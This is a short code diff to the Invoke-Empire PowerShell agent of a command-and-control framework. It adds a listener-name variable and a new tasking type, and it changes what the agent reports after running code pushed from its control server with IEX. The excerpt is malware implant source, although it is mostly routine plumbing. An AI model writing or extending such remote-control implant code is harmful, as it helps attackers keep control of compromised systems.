@@ -100,7 +100,8 @@ function Invoke-Empire {
     $script:ResultIDs = @{}
     $script:WorkingHours = $WorkingHours
     $script:DefaultResponse = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultResponse))
-    $Script:Proxy = $ProxySettings
+    $script:Proxy = $ProxySettings
+    $script:CurrentListenerName = ""
 
     # the currently active server
     $Script:ServerIndex = 0
@@ -1085,12 +1086,19 @@ function Get-FilePart {
                 try {
                     IEX $data
 
-                    Encode-Packet -type $type -data ("$($ControlServers[0])") -ResultID $ResultID
+                    Encode-Packet -type $type -data ($CurrentListenerName) -ResultID $ResultID
                 }
                 catch {
                     
                     Encode-Packet -type 0 -data ("Unable to update agent comm methods: $_") -ResultID $ResultID
                 }
+            }
+
+            elseif($type -eq 131) {
+                # Update the listener name variable
+                $script:CurrentListenerName = $data
+
+                Encode-Packet -type $type -data ("Updated the CurrentListenerName to: $CurrentListenerName") -ResultID $ResultID
             }
 
             else{
